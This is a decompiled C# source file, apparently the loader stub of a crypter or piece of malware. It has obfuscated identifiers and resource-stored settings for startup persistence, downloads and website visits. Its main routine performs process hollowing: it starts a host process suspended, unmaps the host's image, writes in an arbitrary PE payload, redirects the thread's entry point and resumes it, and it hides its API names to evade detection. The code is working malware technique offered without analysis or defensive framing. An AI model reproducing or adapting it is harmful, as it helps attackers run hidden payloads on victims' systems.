using System;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;

namespace fQxuTtw;

public class Memex
{
	private const uint CONTEXT_FULL = 65543u;

	private const int CREATE_SUSPENDED = 4;

	private const int MEM_COMMIT = 4096;

	private const int MEM_RESERVE = 8192;

	private const int PAGE_EXECUTE_READWRITE = 64;

	private const ushort IMAGE_DOS_SIGNATURE = 23117;

	private const uint IMAGE_NT_SIGNATURE = 17744u;

	public static string pass = "&(%$!(#%%''#''$)$!(!)$!$&";

	private static ClaZx.igQiXSlVkUiZ NTW1;

	private static ClaZx.pBhpkEzwcPDh VA1;

	private static ClaZx.JywoSMKsxxae NTU1;

	private static ClaZx.jzNRdJaAITlI NTG1;

	private static ClaZx.tDVuAiMQBdge NTS1;

	private static ClaZx.OrykDIXOqwes NTR1;

	private static byte[] IMAGE_SECTION_HEADER = new byte[40];

	private static byte[] IMAGE_NT_HEADERS = new byte[248];

	private static byte[] IMAGE_DOS_HEADER = new byte[64];

	private static int[] PROCESS_INFO = new int[4];

	private static byte[] CONTEXT35 = new byte[716];

	public static void CLOZ()
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		ResourceManager resourceManager = new ResourceManager("iWotQnkbds", executingAssembly);
		ClaZx.namenorm = resourceManager.GetString("QQSyymE");
		ClaZx.namenet = resourceManager.GetString("zmJjLSQ");
		ClaZx.eofstr = resourceManager.GetString("WYFGLiV");
		ClaZx.otfiles = resourceManager.GetString("EBqrkbZ");
		ClaZx.downex = resourceManager.GetString("aPGshKg");
		ClaZx.visitwebsites = resourceManager.GetString("xBrOYwC");
		ClaZx.startupstring = resourceManager.GetString("gdqnbVi");
		ClaZx.ExtraSt = resourceManager.GetString("RSNimAl");
	}

	public static byte[] BBB(string s)
	{
		return Encoding.Default.GetBytes(s);
	}

	public static string CCC(string s)
	{
		byte[] bytes = ClaZx.enCode(BBB(s), BBB(pass));
		s = Encoding.Default.GetString(bytes);
		return s;
	}

	public static void ZOL()
	{
		ClaZx.obj = Marshal.GetDelegateForFunctionPointer(ClaZx.Gepoad, ClaZx.Teaz);
	}

	public static void setDynamics()
	{
		if (pass != ClaZx.extrastrings[0])
		{
			string ntdll = ClaZx.extrastrings[0];
			string kern = ClaZx.extrastrings[1];
			string writevirtual = ClaZx.extrastrings[2];
			string valloc = ClaZx.extrastrings[3];
			string viewofsec = ClaZx.extrastrings[4];
			string getThC = ClaZx.extrastrings[5];
			string setThC = ClaZx.extrastrings[6];
			string resumeT = ClaZx.extrastrings[7];
			setDynamics2(ntdll, kern, writevirtual, valloc, viewofsec, getThC, setThC, resumeT);
		}
	}

	private static void setDynamics2(string ntdll, string kern, string Writevirtual, string valloc, string Viewofsec, string GetThC, string SetThC, string ResumeT)
	{
		NTW1 = ClaZx.CreateAPI<ClaZx.igQiXSlVkUiZ>(ntdll, Writevirtual);
		VA1 = ClaZx.CreateAPI<ClaZx.pBhpkEzwcPDh>(kern, valloc);
		NTU1 = ClaZx.CreateAPI<ClaZx.JywoSMKsxxae>(ntdll, Viewofsec);
		NTG1 = ClaZx.CreateAPI<ClaZx.jzNRdJaAITlI>(ntdll, GetThC);
		NTS1 = ClaZx.CreateAPI<ClaZx.tDVuAiMQBdge>(ntdll, SetThC);
		NTR1 = ClaZx.CreateAPI<ClaZx.OrykDIXOqwes>(ntdll, ResumeT);
	}

	public unsafe static bool Runoa(byte[] exeBuffer, string hostProcess)
	{
		setDynamics();
		fixed (byte* ptr = &IMAGE_SECTION_HEADER[0])
		{
		}
		fixed (byte* ptr2 = &IMAGE_NT_HEADERS[0])
		{
		}
		fixed (byte* ptr3 = &IMAGE_DOS_HEADER[0])
		{
		}
		fixed (byte* ptr4 = &CONTEXT35[0])
		{
		}
		*(int*)ptr4 = 65543;
		ClaZx.Arraycopy(exeBuffer, 0, IMAGE_DOS_HEADER);
		if (*(ushort*)ptr3 != 23117)
		{
			return false;
		}
		int num = *(int*)(ptr3 + 60);
		ClaZx.Arraycopy(exeBuffer, num, IMAGE_NT_HEADERS);
		if (*(uint*)ptr2 != 17744)
		{
			return false;
		}
		if (!ClaZx.CreateProcess(null, hostProcess, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 4u, IntPtr.Zero, null, new byte[68], PROCESS_INFO))
		{
			return false;
		}
		IntPtr intPtr = new IntPtr(*(int*)(ptr2 + 52));
		NTU1((IntPtr)PROCESS_INFO[0], intPtr);
		if (VA1((IntPtr)PROCESS_INFO[0], intPtr, *(uint*)(ptr2 + 80), 12288u, 64u) == IntPtr.Zero)
		{
			Runoa(exeBuffer, hostProcess);
		}
		fixed (byte* ptr5 = &exeBuffer[0])
		{
			NTW1((IntPtr)PROCESS_INFO[0], intPtr, (IntPtr)ptr5, *(uint*)(ptr2 + 84), IntPtr.Zero);
		}
		for (ushort num2 = 0; num2 < *(ushort*)(ptr2 + 6); num2 = (ushort)(num2 + 1))
		{
			ClaZx.Arraycopy(exeBuffer, num + IMAGE_NT_HEADERS.Length + IMAGE_SECTION_HEADER.Length * num2, IMAGE_SECTION_HEADER);
			fixed (byte* ptr6 = &exeBuffer[*(uint*)(ptr + 20)])
			{
				NTW1((IntPtr)PROCESS_INFO[0], (IntPtr)((int)intPtr + (uint)(*(int*)(ptr + 12))), (IntPtr)ptr6, *(uint*)(ptr + 16), IntPtr.Zero);
			}
		}
		NTG1((IntPtr)PROCESS_INFO[1], (IntPtr)ptr4);
		NTW1((IntPtr)PROCESS_INFO[0], (IntPtr)(uint)(*(int*)(ptr4 + 172)), intPtr, 4u, IntPtr.Zero);
		*(int*)(ptr4 + 176) = (int)intPtr + (int)(*(uint*)(ptr2 + 40));
		NTS1((IntPtr)PROCESS_INFO[1], (IntPtr)ptr4);
		NTR1((IntPtr)PROCESS_INFO[1], IntPtr.Zero);
		return true;
	}
}
